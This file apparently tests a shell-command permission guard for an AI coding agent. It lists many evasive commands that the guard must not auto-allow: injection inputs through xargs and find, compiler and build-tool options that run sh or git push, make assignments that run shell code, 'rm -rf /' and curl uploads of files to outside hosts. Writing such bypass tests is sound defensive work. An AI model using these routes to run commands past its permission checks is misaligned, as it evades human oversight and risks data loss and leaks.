// Council project review 2: code that xargs -I or find -exec fills in is not printed; `git reset
// --merge` discards staged work; a saved "Always allow" for `git rm`
// is not mirrored; compilers and build tools that run a program the call names ask; a pattern a
// runner expands itself counts as a place a session write may lie.
// Run: node test/run.mjs test/council-p2.test.mts.
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, test } from "node:test";
import assert from "node:assert/strict";
import { DEFAULT_ASK, decideShell, mirrorable, SessionState, takeMoment, type Guard } from "../decide.ts";
import { canonical } from "../canon.ts";
SessionState.moment = takeMoment;
import { compileRules } from "../rules.ts";
import { DEFAULT_CLASSIFIER } from "../kev.ts";

assert.ok(process.env.GIT_CONFIG_GLOBAL?.startsWith(os.homedir()), "run through test/run.mjs, which supplies a throwaway $HOME");
const base = fs.realpathSync(fs.mkdtempSync(path.join(os.homedir(), "council-p2-")));
const repo = path.join(base, "repo");
const guard: Guard = {
  rules: compileRules({ ask: DEFAULT_ASK }),
  guarded: [path.resolve(import.meta.dirname, "..")],
  configDirs: [path.join(os.homedir(), ".config", "opencode")],
  allowedPaths: [],
  classifier: DEFAULT_CLASSIFIER,
  useClassifier: false,
  sshHosts: [],
  allowFeatureBranchPush: false,
};

before(() => {
  fs.mkdirSync(repo, { recursive: true });
  fs.writeFileSync(path.join(repo, "f"), "x\n");
  fs.writeFileSync(path.join(repo, "package.json"), JSON.stringify({ scripts: { test: "node --test" } }));
  execFileSync("git", ["init", "-q", "-b", "main", repo]);
  execFileSync("git", ["-C", repo, "add", "-A"]);
  execFileSync("git", ["-C", repo, "commit", "-qm", "init"]);
});
after(() => fs.rmSync(base, { recursive: true, force: true }));

const effect = async (command: string, s = new SessionState(repo)) => (await decideShell(guard, s, repo, command)).effect;

test("code that xargs -I or find -exec fills in asks; the same code with the input as an argument prints", () => {
  const filled = [
    `printf '%s\\n' 'safe; echo EXTRA' | xargs -IXX bash -c 'printf "<%s>\\n" "XX"'`,
    `xargs -I XX bash -c 'echo "XX"'`,
    `xargs -0IXX bash -c 'echo "XX"'`,
    `xargs -I{} sh -c 'echo "{}"'`,
    `xargs -i bash -c 'echo "{}"'`,
    `xargs -iQQ bash -c 'echo "QQ"'`,
    `xargs --replace bash -c 'echo "{}"'`,
    `xargs --replace=QQ bash -c 'echo "QQ"'`,
    `xargs --repl=QQ bash -c 'echo "QQ"'`,
    `xargs -n1 -I XX timeout 5 bash -c 'echo "XX"'`,
    `find . -name f -exec bash -c 'echo "{}"' \\;`,
    `find . -name f -execdir sh -c 'cat "{}"' \\;`,
  ];
  for (const c of filled) assert.ok("ask" in canonical(c), c);
  for (const c of [`xargs bash -c 'echo "$1"' _`, `xargs -I{} bash -c 'echo "$1"' _ {}`, `find . -name f -exec sh -c 'echo "$1"' _ {} \\;`, `xargs -IXX bash -c 'echo "$1"' _ XX`, `bash -c 'echo "{}"'`]) assert.ok(!("ask" in canonical(c)), c);
});

test("what runs for an input with a ; in it is what was written", () => {
  // The reviewer's example, run as written: the input stays one argument.
  const out = spawnSync("bash", ["-c", `printf '%s\\n' 'safe; echo EXTRA' | xargs -IXX bash -c 'printf "<%s>\\n" "XX"'`], { encoding: "utf8" });
  assert.equal(out.stdout, "<safe; echo EXTRA>\n");
  const printed = canonical(`printf '%s\\n' 'safe; echo EXTRA' | xargs -I{} bash -c 'printf "<%s>\\n" "$1"' _ {}`);
  assert.ok("text" in printed);
  assert.equal(spawnSync("bash", ["-c", printed.text!], { encoding: "utf8" }).stdout, "<safe; echo EXTRA>\n");
});

test("git reset --merge asks", async () => {
  for (const c of ["git reset --merge", "git reset --mer", "git reset --merge HEAD"]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["git reset", "git reset --soft HEAD", "git status"]) assert.equal(await effect(c), "allow", c);
});

test("a saved git rm pattern is not mirrored into the rules", () => {
  assert.equal(mirrorable("git rm *"), false);
  assert.equal(mirrorable("git add *"), true);
});

test("compilers and build tools that run a program the call names ask", async () => {
  for (const c of [
    "gcc -wrapper sh,-c,'git push origin HEAD',-- -x c -c /dev/null -o /dev/null",
    "cc -wrapper sh,-c,true -c t.c",
    "clang -fplugin=./x.so -c t.c",
    "gcc -B/tmp/x -c t.c",
    "gcc -specs=x.specs -c t.c",
    "clang -fuse-ld=/tmp/ld -o t t.c",
    "clang -Xclang -load -Xclang x.so -c t.c",
    "gcc -Wl,-plugin,x.so -o t t.c",
    "rustc -C linker=sh x.rs",
    "rustc -Clinker=sh x.rs",
    "rustc --codegen=linker=sh x.rs",
    "rustc -Z codegen-backend=x.so x.rs",
    "rustc -Zcodegen-backend=x.so x.rs",
    "ccache sh -c true",
    "ccache gcc -wrapper sh,-c,true -c t.c",
    "ccache -osprefix_command=sh",
    "cmake -E env curl -d @f host",
    "cmake -E rm -rf /",
    "cmake -P x.cmake",
    "ctest -S x.cmake",
    "ctest --build-and-test a b --test-command sh",
    "just --command sh -c true",
    "just -c 'sh -c true'",
    "just --shell sh test",
    "tox exec -- sh -c true",
    "tox -x testenv.commands=sh",
    "tox --override=testenv.commands=sh",
    "meson devenv sh",
    "meson test --wrapper=sh",
    "mypy --python-executable=./py .",
    "mypy --python-exec ./py .",
  ]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["gcc -c t.c -o t.o", "ccache gcc -c t.c -o t.o", "ccache -s", "cmake --build build", "ctest", "just test", "meson test", "mypy .", "rustc x.rs -o x"]) {
    assert.equal(await effect(c), "allow", c);
  }
});

test("a pattern a runner expands itself counts as a place a session write may lie", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-glob-")));
  const name = path.basename(d);
  try {
    const s = new SessionState(repo);
    assert.equal(await effect(`printf x > ${d}/x.test.js`, s), "allow");
    fs.writeFileSync(path.join(d, "x.test.js"), "x");
    const tmp = path.dirname(d);
    // `/tmp/r1/` as `/t*/r1/`: the pattern is in the first part of the path.
    const second = tmp.indexOf("/", 1);
    const fuzzy = `/${tmp[1]}*${second < 0 ? "" : tmp.slice(second)}`;
    for (const c of [`npm test -- '${fuzzy}/${name}/x.test.js'`, `npm test -- '${tmp}/${name.slice(0, 4)}*/x.test.js'`, `npm test -- '${tmp}/{${name},y}/x.test.js'`, `npm test -- '/*/${name}/x.test.js'`, `npm test -- --test-name-pattern=x '${tmp}/${name}/*.js'`]) {
      assert.notEqual(await effect(c, s), "allow", c);
    }
    // A pattern inside the project counts from where it starts, as before.
    assert.equal(await effect("npm test -- 'src/*.test.js'", new SessionState(repo)), "allow");
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
});

// ---- round 2 ----

test("round 2: a placeholder that only the printed code holds, or one bash computes, asks", () => {
  for (const c of [
    `printf '%s\\n' 'safe; echo EXTRA' | xargs -IXX bash -c 'echo X"X"'`,
    `xargs -I XX bash -c 'echo "X"X'`,
    `find . -maxdepth 0 -exec bash -c 'echo "{""}"' \;`,
    `find . -type f -exec bash -c 'echo \\{\\}' \;`,
    `printf 'x; echo INJECTED; echo \\\\n' | xargs -I"'" bash -c 'echo "a b"'`,
    `M=foo; xargs -I "$M" bash -c 'echo "foo"'`,
    `xargs -I "$(echo foo)" bash -c 'echo "foo"'`,
    `xargs -I fo* bash -c 'echo "foo"'`,
  ]) assert.ok("ask" in canonical(c), c);
  // What prints keeps doing what was written.
  for (const c of [`printf '%s\\n' 'a; echo EXTRA' | xargs -I{} bash -c 'printf "<%s>\\n" "$1"' _ {}`, `printf '%s\\n' 'a; echo EXTRA' | xargs -IXX bash -c 'printf "<%s>\\n" "$1"' _ XX`]) {
    const printed = canonical(c);
    assert.ok("text" in printed, c);
    const run = (t: string) => spawnSync("bash", ["-c", t], { encoding: "utf8" }).stdout;
    assert.equal(run(printed.text!), run(c), c);
  }
});

test("round 2: a build tool's option held in a variable goes to the model; rustc's _ spelling, cmake's compilers, go's -extld ask", async () => {
  for (const c of ["W=-wrapper; gcc $W sh,-c,true -c t.c", `W=-wrapper; gcc "$W" sh,-c,true -c t.c`, "gcc $CFLAGS -c t.c", "A=-Clinker=sh; rustc $A x.rs", "E=-E; cmake $E env sh", "J=--command; just $J sh", "clang ${W} x -c t.c"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of [
    "rustc -C link_arg=-wrapper x.rs", "rustc -Clink_arg=x x.rs", "rustc -C link_args=x x.rs", "rustc --codegen link_arg=x x.rs", "rustc --codegen=link_arg=x x.rs",
    "gcc --prefix=/tmp/x -c t.c", "gcc --prefix /tmp/x -c t.c", "gcc -Wp,-fplugin=x.so -c t.c", "gcc --for-linker=-plugin --for-linker=x.so t.c",
    "cmake -C x.cmake .", "cmake -DCMAKE_C_COMPILER=/tmp/prog .", "cmake -D CMAKE_C_COMPILER_LAUNCHER=sh .", "cmake -DCMAKE_TOOLCHAIN_FILE:FILEPATH=x.cmake .", "cmake --toolchain x.cmake .",
    "go build -ldflags=-extld=sh .", "go build -ldflags '-linkmode=external -extld /tmp/prog' .",
    "just --chooser 'sh -c x' --choose", "mypy --install-types .",
    "npm run env -- sh -c true", "npm run env", "npm run-script env", "pnpm run env -- sh -c true", "yarn run env",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["cmake -DCMAKE_BUILD_TYPE=Release -S . -B build", "go build -ldflags=-s .", "npm run build", "rustc -C opt-level=2 x.rs"]) assert.notEqual(await effect(c), "ask", c);
});

test("round 2: git clean -i and a checkout operand with a backslash ask", async () => {
  for (const c of ["git clean -i", "git clean --interactive", "git clean -di", "git checkout '\\f'", "git checkout '\\x'"]) assert.equal(await effect(c), "ask", c);
});

test("round 2: node's extglob and a backslash in a runner's pattern count as places", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-ext-")));
  const name = path.basename(d);
  const tmp = path.dirname(d);
  try {
    const s = new SessionState(repo);
    assert.equal(await effect(`printf x > ${d}/x.test.js`, s), "allow");
    fs.writeFileSync(path.join(d, "x.test.js"), "x");
    for (const c of [`npm test -- '${tmp}/!(zzz)/x.test.js'`, `npm test -- '${tmp}/@(${name})/x.test.js'`, `npm test -- '${tmp}/+(${name})/x.test.js'`, `npm test -- '/\\${tmp.slice(1)}/${name}/x.test.js'`, `npm test -- '${tmp}/${name}\\/x.test.js'`, `npm test -- '/@(${tmp.split("/")[1]})${tmp.slice(tmp.indexOf("/", 1) < 0 ? tmp.length : tmp.indexOf("/", 1))}/${name}/x.test.js'`]) {
      assert.notEqual(await effect(c, s), "allow", c);
    }
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
});

// ---- round 3 ----

test("round 3: npm's env script wherever it stands after run, go's -extld anywhere, tox's subcommand anywhere, git clean but a dry run, cmake's make program and includes", async () => {
  for (const c of [
    "npm run -- env sh -c true", "npm --prefix . run env -- sh -c true", "npm run --prefix src env -- sh -c true", "npm --loglevel silent run env -- sh -c true", "npm run -w pk env -- sh -c true", "npm -w pk run env -- sh -c true", "npm run-script -- env sh -c true", "npm run --loglevel warn env -- sh -c true",
    "go build -ldflags=-s -ldflags='-linkmode=external -extld=/tmp/prog' .", "go build -ldflags -s -ldflags '-extld=sh' .", "go tool link -extld sh x", "go build -compiler=gccgo -gccgoflags=-wrapper .",
    "tox -e py exec -- sh -c true", "tox -c tox.ini e -- sh", "tox --workdir .tox exec -- sh",
    "git clean", "git clean -dx", "git clean -d -x -q", "git clean -X",
    "cmake -DCMAKE_MAKE_PROGRAM=/tmp/prog -S . -B build", "cmake -DCMAKE_PROJECT_INCLUDE=/tmp/x.cmake .", "cmake -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=x.cmake .", "cmake -DCMAKE_USER_MAKE_RULES_OVERRIDE=x.cmake .", "cmake '-DCMAKE_C_FLAGS=-wrapper sh,-c,true' .",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["git clean -n", "git clean -dn", "git clean --dry-run -x", "go build -ldflags=-s .", "tox -e py", "npm run build", "cmake -DCMAKE_C_FLAGS=-O2 ."]) assert.notEqual(await effect(c), "ask", c);
});

test("round 3: a runner's word with a %xx escape or a data: URL is a place the check cannot tell", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-url-")));
  try {
    const s = new SessionState(repo);
    fs.mkdirSync(path.join(d, "a.b"));
    assert.equal(await effect(`printf x > ${d}/a.b/x.test.js`, s), "allow");
    fs.writeFileSync(path.join(d, "a.b", "x.test.js"), "x");
    const escaped = `${d}/a.b/x.test.js`.replace(/^\/(.)/, (_, c: string) => `/%${c.charCodeAt(0).toString(16)}`);
    for (const c of [`npm test -- --import=file://${escaped}`, `npm test -- --import=file://${d}/a%2Eb/x.test.js`, `npm test -- --import 'data:text/javascript,import "file://${escaped}"'`]) {
      assert.notEqual(await effect(c, s), "allow", c);
    }
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
});

// ---- round 4 ----

test("round 4: git clean is read as git reads it; -i asks whatever else is there", async () => {
  for (const c of ["git clean -e -n", "git clean --exclude -n", "git clean -en", "git clean -xen", "git clean -dq -en", "git clean -n --no-dry-run", "git clean --dry-run --no-dry-run", "git clean -i -n", "git clean -en -i", "git clean -n --no-d -i", "git clean -n --frobnicate"]) {
    assert.equal(await effect(c), "ask", c);
  }
  for (const c of ["git clean -n", "git clean -dxn", "git clean -e x -n", "git clean --exclude=x --dry-run", "git clean --no-dry-run -n", "git clean --dry"]) assert.equal(await effect(c), "allow", c);
});

test("round 4: what a compiler writes under a name it or a linker option chooses marks where it ran", async () => {
  for (const writer of [
    "printf 'fn main(){}' | rustc - -o node_modules/.bin/node",
    "rustc --emit=link=node_modules/.bin/node x.rs",
    "rustc --out-dir node_modules/.bin x.rs",
    "rustc x.rs",
    "printf 'int main(){}' | gcc -xc - -Wl,-o,node_modules/.bin/node",
    "gcc -xc - -Wl,--output=node_modules/.bin/node",
    "gcc -xc - -Xlinker -o -Xlinker node_modules/.bin/node",
    "gcc t.c",
    "ccache gcc -xc - -o node_modules/.bin/node",
  ]) {
    const s = new SessionState(repo);
    // Either the writer asks (what is approved runs outside the sandbox), or what it wrote is
    // marked and npm goes to the model after it.
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  const s = new SessionState(repo);
  assert.equal(await effect("rustc --version", s), "allow");
  assert.equal(await effect("npm test", s), "allow");
});

test("round 4: cargo hands rustc its words after --; make's values and cmake's variables are read", async () => {
  for (const c of [
    "cargo clippy -- --emit=link -Clink-arg=-wrapper -Clink-arg=sh,-c,true,--", "cargo clippy -- -Clinker=/bin/false", "cargo rustc -- -C linker=sh", "cargo rustdoc -- -Z x",
    "make x.o CFLAGS=-wrapper CPPFLAGS=sh,-c,id", "make CFLAGS=-B/tmp/x", "make LDFLAGS=-Wl,-plugin,x.so",
    "cmake -DCMAKE_C_LINK_EXECUTABLE=sh .", "cmake -DCMAKE_AR=/tmp/ar .", "cmake -DCMAKE_C_CLANG_TIDY=sh .", "cmake -DCMAKE_CROSSCOMPILING_EMULATOR=sh .", "cmake '-DCMAKE_C_STANDARD_LIBRARIES=-wrapper sh,-c,x' .",
    "cmake --build build -- SHELL=/tmp/sh", "cmake --build build -- --eval=x",
    "go build -ldflags=-extar=/tmp/x .", "go tool link -extar /tmp/x x",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["cargo clippy -- -D warnings", "cargo test -- --nocapture", "make CFLAGS=-O2", "cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_TESTING=ON .", "cmake --build build -- -j4"]) assert.notEqual(await effect(c), "ask", c);
});

// ---- round 5 ----

test("round 5: every compile that is not a pure query is a write; an option that can name the place marks the project", async () => {
  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-cc-")));
  try {
    for (const [writer, cwd] of [
      ["gcc -v t.c", repo], ["gcc -v -c t.c", repo], ["gcc -dumpbase x t.c", repo], ["gcc -I -o/tmp/zz t.c", repo],
      ["gcc -c t.c -o /dev/null -Wa,-al=test.sh", repo], ["gcc -c t.c -o /dev/null -Xassembler -al=test.sh", repo],
      ["gcc -E t.c --write-dependencies -MT x", repo], ["gcc -fsyntax-only -fdump-tree-original=build.sh t.c", repo],
      ["rustc --print link-args t.rs -o tool", repo], ["rustc --print cfg=build.sh t.rs", repo], ["rustc --print native-static-libs t.rs", repo],
      [`gcc -M -MF ${repo}/z.test.js -MT x -xc /dev/null`, outside],
    ] as const) {
      const s = new SessionState(repo);
      const wrote = (await decideShell(guard, s, cwd, writer)).effect;
      assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
    }
    for (const query of ["gcc --version", "gcc -dumpmachine", "gcc -print-file-name=libc.so", "rustc --version", "rustc --print sysroot", "rustc -vV"]) {
      const s = new SessionState(repo);
      assert.equal(await effect(query, s), "allow", query);
      assert.equal(await effect("npm test", s), "allow", query);
    }
  } finally {
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("round 5: gcc's options are words of their own; cargo's subcommand behind a global option's value; cmake's other program variables", async () => {
  for (const c of ["gcc -fno-omit-frame-pointer t.c -o x", "gcc -fno-strict-aliasing -c t.c -o t.o", "g++ -fno-exceptions -c t.cc -o t.o"]) assert.equal(await effect(c), "allow", c);
  for (const c of [
    "cargo --color never clippy -- --emit=link -Clinker=/bin/false", "cargo --color always clippy -- -C linker=sh",
    "cmake -DCMAKE_EXE_LINKER_FLAGS=--ld-path=./x .", "cmake -DCMAKE_C_FLAGS=--gcc-toolchain=./x .", "cmake -DGIT_EXECUTABLE=/tmp/g .", "cmake -DPKG_CONFIG_EXECUTABLE=/tmp/p .", "cmake -DFoo_DIR=/tmp/x .", "cmake --build build -- -f /tmp/x.mk",
  ]) assert.equal(await effect(c), "ask", c);
  for (const c of ["cmake --build build -- -j4 -k", "cmake -DBUILD_TESTING=ON -DCMAKE_BUILD_TYPE=Debug ."]) assert.notEqual(await effect(c), "ask", c);
});

// ---- round 6 ----

test("round 6: a query word that is an option's value, an input of any name, or an @file makes a compile a write", async () => {
  for (const writer of [
    "rustc --print link-args src -o output", "printf 'fn main(){}' | rustc -L -V - -o node_modules/.bin/node", "rustc --cfg --version x", "rustc --print native-static-libs /dev/stdin -o o", "rustc --print sysroot @rr2",
    "gcc -I -E t.c", "gcc -L -fsyntax-only t.c", "printf 'int e;' | gcc -I -E -c -include /dev/stdin t.c", "gcc -E -P @/tmp/rsp", "gcc -E -C @/tmp/rsp",
  ]) {
    const s = new SessionState(repo);
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  // A header compiled from elsewhere: its .gch lands beside it, in the project.
  const outside = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-pch-")));
  try {
    const s = new SessionState(repo);
    const wrote = (await decideShell(guard, s, outside, `gcc -x c-header ${repo}/x.h`)).effect;
    assert.ok(wrote !== "allow" || (await effect("make", s)) !== "allow");
  } finally {
    fs.rmSync(outside, { recursive: true, force: true });
  }
});

test("round 6: an @file after -c or -S is a place the check cannot tell; -fmodule-mapper asks", async () => {
  const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "cp2-rsp-")));
  try {
    const s = new SessionState(repo);
    assert.equal(await effect(`printf x > ${d}/rsp`, s), "allow");
    fs.writeFileSync(path.join(d, "rsp"), "x");
    for (const c of [`gcc -c @${d}/rsp t.c`, `gcc -S @${d}/rsp t.c`, `npm test -- -c @${d}/rsp`]) assert.notEqual(await effect(c, s), "allow", c);
  } finally {
    fs.rmSync(d, { recursive: true, force: true });
  }
  for (const c of ["g++ -fmodules-ts '-fmodule-mapper=|git push origin HEAD' -c x.cc", "ccache g++ '-fmodule-mapper=|sh' -c x.cc", "cmake '-DCMAKE_CXX_FLAGS=-fmodule-mapper=|sh' .", `cmake '-DCMAKE_C_FLAGS="-B/tmp/x"' .`, "cmake -DFETCHCONTENT_SOURCE_DIR_FOO=/tmp/x ."]) {
    assert.equal(await effect(c), "ask", c);
  }
});

// ---- round 7 ----

test("round 7: -E and -fsyntax-only are compiles; make's other assignment forms, a rustup toolchain path and set +B ask", async () => {
  for (const writer of ["gcc --include-directory -E t.c", "gcc --library-directory -E t.c", "gcc -F -E t.c", "gcc -fsyntax-only -fno-syntax-only -c t.c", "g++ --include-directory -fsyntax-only t.c", "ccache gcc --include-directory -E t.c", "gcc -E t.c", "gcc -fsyntax-only t.c"]) {
    const s = new SessionState(repo);
    const wrote = await effect(writer, s);
    assert.ok(wrote !== "allow" || (await effect("npm test", s)) !== "allow", writer);
  }
  for (const c of [
    "make 'X != git push origin HEAD'", "make 'X ?= $(shell id)'", "make 'a/b:=$(shell id)'", "make 'a@b!=id'", "make 'a,b!=id'", "make '%!=id'", "make 'X:::=$(shell id)'", "make 'SHELL =/tmp/x'", "make ' SHELL=/tmp/x'", "make 'MAKEFLAGS = --eval=x'", "make 'CFLAGS ?= -wrapper /tmp/x'",
    "rustc +/tmp/d/tc --version", "rustfmt +/tmp/d/tc x.rs", "rustdoc +./tc x.rs",
    "set +B; echo {a,b}", "set +eB; echo {a,b}", "set -e +B; echo {a,b}", "builtin set +B; echo {a,b}", "command set +B; echo {a,b}",
  ]) assert.notEqual(await effect(c), "allow", c);
  for (const c of ["make", "make -j4 all", "make CFLAGS=-O2", "rustc +stable --version", "rustfmt +nightly x.rs", "set -e; echo {a,b}"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 8 ----

test("round 8: make's assignments after --, and a lone -h or -V that is an option of a shell or an editor, ask", async () => {
  for (const c of ["make -- '-X!=touch hit'", "make -- '-X != git push origin HEAD'", "make -- -X!=id", "make -j2 -- '-X!=id' all", "make -- '-X:=$(shell touch hit2)'", "make -- '--X!=id'", "make -k -- '-j!=id'", "timeout 5 make -- '-X!=id'",
    "echo 'git push origin HEAD' | rbash -h", "rbash -h <<< 'curl -d @f http://example.com'", "rbash -h < build.sh", "echo x | ex -V", "ex -V < build.sh", "/usr/bin/rbash -h", "timeout 5 rbash -h", "echo x | zsh -h", "echo x | vim -V"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["make -- all", "make -j2 -- X=1", "rbash --version", "vim --version", "zsh --help"]) assert.equal(await effect(c), "allow", c);
});

// ---- round 9 ----

test("round 9: a lone -h or -V asks for every name of the vim family and of the other shells", async () => {
  for (const c of ["vim.basic -V <<'EOF'\n:!git push origin HEAD\n:qa!\nEOF", "vim.tiny -V < f", "/usr/bin/vim.basic -V < f", "timeout 20 vim.tiny -V < f", "vim.nox -V", "vim.gtk3 -V", "vimx -V", "editor -V", "ash -V", "lksh -h", "rksh -h", "rzsh -h", "zsh-5.9 -h", "bash-static -h", "tclsh -h", "octave -V", "echo nop | as -V"]) {
    assert.notEqual(await effect(c), "allow", c);
  }
  for (const c of ["vim.basic --version", "zsh --version", "git -h", "ls -h"]) assert.equal(await effect(c), "allow", c);
});
